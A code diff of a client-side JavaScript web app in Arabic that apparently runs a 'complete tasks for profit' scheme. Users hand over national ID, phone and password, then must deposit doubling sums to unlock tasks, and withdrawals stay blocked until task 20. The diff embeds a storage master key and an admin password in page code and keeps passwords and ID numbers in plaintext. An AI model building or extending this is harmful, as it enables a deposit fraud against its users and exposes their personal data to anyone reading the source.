@@ -1,61 +1,37 @@
-// ==== إعداد Bin.io ====
-const BIN_ID = "6924db89d0ea881f40fde913"; 
-const MASTER_KEY = "$2a$10$k7UNDXuzwGDFt8SlvSm02.DfIHhcwx5A/IurS6k0..aiZ8aLYkVz2";
-
-// ==== بيانات المستخدم الحالي ====
+// ==== بيانات المستخدمين ====
 let currentUser = null;
 let allUsers = [];
+const adminPassword = "aalmwt10";
+const BIN_ID = "6924db89d0ea881f40fde913"; // ضع Bin ID هنا
+const MASTER_KEY = "$2a$10$k7UNDXuzwGDFt8SlvSm02.DfIHhcwx5A/IurS6k0..aiZ8aLYkVz2"; // ضع Master Key هنا
 
-// ==== قراءة البيانات من JSONBin ====
+// ==== دوال Bin.io ====
 async function readData() {
-  try {
-    const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-      headers: { "X-Master-Key": MASTER_KEY }
-    });
-    const data = await res.json();
-    allUsers = data.record.users || [];
-  } catch (err) {
-    console.error("خطأ في جلب البيانات من Bin:", err);
-    allUsers = [];
-  }
+  const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+    headers: { "X-Master-Key": MASTER_KEY }
+  });
+  const json = await res.json();
+  allUsers = json.record.allUsers || [];
 }
 
-// ==== تحديث البيانات في JSONBin ====
 async function updateData() {
-  try {
-    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-      method: "PUT",
-      headers: {
-        "Content-Type": "application/json",
-        "X-Master-Key": MASTER_KEY
-      },
-      body: JSON.stringify({ users: allUsers })
-    });
-  } catch (err) {
-    console.error("خطأ في تحديث Bin:", err);
-  }
+  await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+    method: "PUT",
+    headers: {
+      "Content-Type": "application/json",
+      "X-Master-Key": MASTER_KEY
+    },
+    body: JSON.stringify({ allUsers })
+  });
 }
 
-// ==== حفظ المستخدم الحالي في localStorage ====
-function saveCurrentUserEmail() {
-  if(currentUser) localStorage.setItem("currentUserEmail", currentUser.email);
-  else localStorage.removeItem("currentUserEmail");
-}
-
-// ==== تحميل المستخدم الحالي من localStorage ====
-async function loadCurrentUser() {
-  await readData();
-  const email = localStorage.getItem("currentUserEmail");
-  if(email) currentUser = allUsers.find(u=>u.email===email);
-}
-
-// ==== عرض/إخفاء الهيدر ====
+// ==== عرض الهيدر ====
 function showHeader(show) {
   document.getElementById("header").style.display = show ? "flex" : "none";
 }
 
 // ==== تسجيل الدخول / إنشاء حساب ====
-async function loginPage() {
+function loginPage() {
   showHeader(false);
   document.getElementById("app").innerHTML = `
   <div class="container"><div class="box">
@@ -67,7 +43,7 @@ async function loginPage() {
   </div></div>`;
 }
 
-async function registerPage() {
+function registerPage() {
   showHeader(false);
   document.getElementById("app").innerHTML = `
   <div class="container"><div class="box">
@@ -89,71 +65,70 @@ async function registerPage() {
 }
 
 async function register() {
-  await readData();
   let name = document.getElementById("regName").value;
   let email = document.getElementById("regEmail").value;
   let nid = document.getElementById("regNID").value;
   let phone = document.getElementById("regPhone").value;
   let country = document.getElementById("regCountry").value;
   let pass = document.getElementById("regPass").value;
-  if(!name||!email||!nid||!phone||!pass){alert("يرجى ملء جميع الحقول");return;}
+
+  if (!name || !email || !nid || !phone || !pass) { alert("يرجى ملء جميع الحقول"); return; }
+
+  await readData();
+  if (allUsers.find(u => u.email === email)) { alert("البريد مستخدم مسبقًا"); return; }
 
   currentUser = {
-    name,email,nid,phone,country,pass,
-    balance:0,
-    tasksCompleted:0,
-    taskDeposits:Array(25).fill(0),
-    depositRequests:[],
-    withdrawRequests:[]
+    name, email, nid, phone, country, pass,
+    balance: 0,
+    tasksCompleted: 0,
+    taskDeposits: Array(25).fill(0),
+    depositRequests: [],
+    withdrawRequests: []
   };
+
   allUsers.push(currentUser);
-  saveCurrentUserEmail();
   await updateData();
   homePage();
 }
 
 async function login() {
-  await readData();
   let email = document.getElementById("loginEmail").value;
   let pass = document.getElementById("loginPass").value;
-  let found = allUsers.find(u=>u.email===email && u.pass===pass);
-  if(!found){alert("بيانات غير صحيحة");return;}
+
+  await readData();
+  let found = allUsers.find(u => u.email === email && u.pass === pass);
+  if (!found) { alert("بيانات غير صحيحة"); return; }
+
   currentUser = found;
-  saveCurrentUserEmail();
   homePage();
 }
 
 // ==== الصفحة الرئيسية + المهام ====
 function homePage() {
   showHeader(true);
-  let tasksHtml="";
-  let depositAmount=10;
-  let reward=20;
+  let tasksHtml = "";
+  let depositAmount = 15;
+  let reward = 30;
 
-  for(let i=0;i<25;i++){
-    let locked=currentUser.taskDeposits[i]<depositAmount || currentUser.tasksCompleted<i;
-    let completed=currentUser.tasksCompleted>i;
-
-    if(i>=14){
-      depositAmount=Math.floor(Math.random()*9000)+1000;
-      reward=Math.floor(Math.random()*9000)+1000;
-    }
-
-    tasksHtml+=`
-      <div class="task ${locked?'locked':''}">
+  for (let i = 14; i < 25; i++) { // المهام من 15 إلى 25
+    let locked = currentUser.taskDeposits[i] < depositAmount || currentUser.tasksCompleted < i;
+    let completed = currentUser.tasksCompleted > i;
+    tasksHtml += `
+      <div class="task ${locked ? 'locked' : ''}">
         <i class="fa-solid fa-rocket"></i>
         <div class="task-content">
-          <h3>المهمة رقم ${i+1}</h3>
+          <h3>المهمة رقم ${i + 1}</h3>
           <p>الإيداع المطلوب: <b>${depositAmount}$</b></p>
           <p>الربح عند الإنجاز: <b>${reward}$</b></p>
-          <p>الحالة: <b>${completed?'تم الإنجاز':locked?'مقفلة':'جاهزة'}</b></p>
-          <button onclick="openTask(${i},${depositAmount},${reward})" ${locked||completed?'disabled':''}>تنفيذ المهمة</button>
+          <p>الحالة: <b>${completed ? 'تم الإنجاز' : locked ? 'مقفلة' : 'جاهزة'}</b></p>
+          <button onclick="openTask(${i},${depositAmount},${reward})" ${locked || completed ? 'disabled' : ''}>تنفيذ المهمة</button>
         </div>
       </div>`;
-    if(i<14){depositAmount*=2; reward*=2;}
+    depositAmount = Math.min(depositAmount * 2, 10000);
+    reward = Math.min(reward * 2, 10000);
   }
 
-  document.getElementById("app").innerHTML=`
+  document.getElementById("app").innerHTML = `
   <div class="container">
     <h2>مرحبا ${currentUser.name} | رصيدك: ${currentUser.balance}$</h2>
     ${tasksHtml}
@@ -161,11 +136,11 @@ function homePage() {
 }
 
 // ==== فتح المهمة ====
-function openTask(index,dep,rew){
-  document.getElementById("app").innerHTML=`
+function openTask(index, dep, rew) {
+  document.getElementById("app").innerHTML = `
   <div class="container">
     <div class="box">
-      <h2>المهمة رقم ${index+1}</h2>
+      <h2>المهمة رقم ${index + 1}</h2>
       <p>المطلوب قبل التنفيذ: إيداع ${dep}$</p>
       <p>ربحك بعد الإنجاز: ${rew}$</p>
       <button onclick="checkDeposit(${index},${dep},${rew})">تنفيذ المهمة</button>
@@ -174,26 +149,21 @@ function openTask(index,dep,rew){
   </div>`;
 }
 
-async function checkDeposit(index,dep,rew){
-  if(currentUser.taskDeposits[index]<dep){alert(`❌ لا يمكن تنفيذ المهمة بدون إيداع ${dep}$`); return;}
-  currentUser.balance+=rew;
-  currentUser.tasksCompleted=Math.max(currentUser.tasksCompleted,index+1);
-  await saveUser();
+async function checkDeposit(index, dep, rew) {
+  if (currentUser.taskDeposits[index] < dep) {
+    alert(`❌ لا يمكن تنفيذ المهمة بدون إيداع ${dep}$`);
+    return;
+  }
+  currentUser.balance += rew;
+  currentUser.tasksCompleted = Math.max(currentUser.tasksCompleted, index + 1);
+  await saveCurrentUser();
   alert("✅ تم تنفيذ المهمة وتم إضافة الأرباح!");
   homePage();
 }
 
-// ==== حفظ المستخدم الحالي ====
-async function saveUser(){
-  let idx=allUsers.findIndex(u=>u.email===currentUser.email);
-  if(idx!==-1) allUsers[idx]=currentUser;
-  saveCurrentUserEmail();
-  await updateData();
-}
-
-// ==== الإيداع ====
-function depositPage(){
-  document.getElementById("app").innerHTML=`
+// ==== الايداع ====
+function depositPage() {
+  document.getElementById("app").innerHTML = `
   <div class="container">
     <div class="box">
       <h2>إيداع الأموال</h2>
@@ -207,15 +177,15 @@ function depositPage(){
   </div>`;
 }
 
-async function submitDeposit(){
-  let amount=parseFloat(document.getElementById("depositAmount").value);
-  let image=document.getElementById("depositImage").files[0];
-  if(!amount||!image){alert("يرجى إدخال المبلغ ورفع الصورة"); return;}
+async function submitDeposit() {
+  let amount = parseFloat(document.getElementById("depositAmount").value);
+  let image = document.getElementById("depositImage").files[0];
+  if (!amount || !image) { alert("يرجى إدخال المبلغ ورفع الصورة"); return; }
 
-  let reader=new FileReader();
-  reader.onload=async function(){
-    currentUser.depositRequests.push({amount,image:reader.result,date:new Date().toLocaleString()});
-    await saveUser();
+  let reader = new FileReader();
+  reader.onload = async function () {
+    currentUser.depositRequests.push({ amount, image: reader.result, date: new Date().toLocaleString() });
+    await saveCurrentUser();
     alert("✅ تم إرسال طلب الإيداع");
     homePage();
   }
@@ -223,9 +193,9 @@ async function submitDeposit(){
 }
 
 // ==== السحب ====
-function withdrawPage(){
-  if(currentUser.tasksCompleted<20){alert("❌ لا يمكن السحب قبل المهمة 20"); return;}
-  document.getElementById("app").innerHTML=`
+function withdrawPage() {
+  if (currentUser.tasksCompleted < 20) { alert("❌ لا يمكن السحب قبل المهمة 20"); return; }
+  document.getElementById("app").innerHTML = `
   <div class="container">
     <div class="box">
       <h2>سحب الأموال</h2>
@@ -237,35 +207,43 @@ function withdrawPage(){
   </div>`;
 }
 
-async function submitWithdraw(){
-  let w=document.getElementById("withdrawWallet").value;
-  if(!w){alert("يرجى إدخال المحفظة"); return;}
-  currentUser.withdrawRequests.push({wallet:w,amount:currentUser.balance,date:new Date().toLocaleString()});
-  currentUser.balance=0;
-  await saveUser();
+async function submitWithdraw() {
+  let w = document.getElementById("withdrawWallet").value;
+  if (!w) { alert("يرجى إدخال المحفظة"); return; }
+  currentUser.withdrawRequests.push({ wallet: w, amount: currentUser.balance, date: new Date().toLocaleString() });
+  currentUser.balance = 0;
+  await saveCurrentUser();
   alert("✅ تم إرسال طلب السحب");
   homePage();
 }
 
+// ==== تحديث بيانات المستخدم الحالي ====
+async function saveCurrentUser() {
+  await readData();
+  let index = allUsers.findIndex(u => u.email === currentUser.email);
+  if (index !== -1) {
+    allUsers[index] = currentUser;
+    await updateData();
+  }
+}
+
 // ==== تسجيل الخروج ====
-function logout(){currentUser=null; saveCurrentUserEmail(); showHeader(false); loginPage();}
+function logout() { currentUser = null; showHeader(false); loginPage(); }
 
 // ==== لوحة الإدارة ====
-const adminPassword="aalmwt10";
-
-async function adminLogin(){
-  let pwd=prompt("ادخل كلمة مرور الادمن:");
-  if(pwd!==adminPassword){alert("كلمة مرور خاطئة"); return;}
+async function adminLogin() {
+  let pwd = prompt("ادخل كلمة مرور الادمن:");
+  if (pwd !== adminPassword) { alert("كلمة مرور خاطئة"); return; }
 
   await readData();
   showHeader(false);
 
-  let requestsHtml="";
-  allUsers.forEach(u=>{
-    u.depositRequests.forEach((r,i)=>{
-      requestsHtml+=`
+  let requestsHtml = "";
+  allUsers.forEach(u => {
+    u.depositRequests.forEach((r, i) => {
+      requestsHtml += `
       <div class="admin-request">
-        <p><b>المستخدم:</b> ${u.name} | ${u.email} | ${u.phone}</p>
+        <p><b>المستخدم:</b> ${u.name} | ${u.email}</p>
         <p><b>المبلغ:</b> ${r.amount}$ | التاريخ: ${r.date}</p>
         <img src="${r.image}" alt="صورة الإيداع" style="max-width:200px;">
         <div style="display:flex;gap:10px;">
@@ -276,34 +254,31 @@ async function adminLogin(){
     });
   });
 
-  document.getElementById("app").innerHTML=`
-  <div class="container">
-    <h2>طلبات الإيداع</h2>
-    ${requestsHtml||"<p>لا توجد طلبات حالياً</p>"}
-    <button class="back-btn" onclick="homePage()">رجوع</button>
-  </div>`;
+  document.getElementById("app").innerHTML = `<div class="container"><h2>طلبات الإيداع</h2>${requestsHtml || "<p>لا توجد طلبات حالياً</p>"}<button class="back-btn" onclick="homePage()">رجوع</button></div>`;
 }
 
-async function approveDeposit(email,index){
+async function approveDeposit(email, index) {
   await readData();
-  let user=allUsers.find(u=>u.email===email);
-  if(!user) return;
-  let req=user.depositRequests[index];
-  user.balance+=req.amount;
-  user.taskDeposits[user.tasksCompleted]+=req.amount;
-  user.depositRequests.splice(index,1);
+  let user = allUsers.find(u => u.email === email);
+  if (!user) return;
+
+  let req = user.depositRequests[index];
+  user.balance += req.amount;
+  user.depositRequests.splice(index, 1);
   await updateData();
+  if (currentUser.email === email) currentUser = user;
   adminLogin();
 }
 
-async function rejectDeposit(email,index){
+async function rejectDeposit(email, index) {
   await readData();
-  let user=allUsers.find(u=>u.email===email);
-  if(!user) return;
-  user.depositRequests.splice(index,1);
+  let user = allUsers.find(u => u.email === email);
+  if (!user) return;
+
+  user.depositRequests.splice(index, 1);
   await updateData();
   adminLogin();
 }
 
 // ==== بدء التطبيق ====
-loadCurrentUser().then(()=>currentUser?homePage():loginPage());
+loginPage();
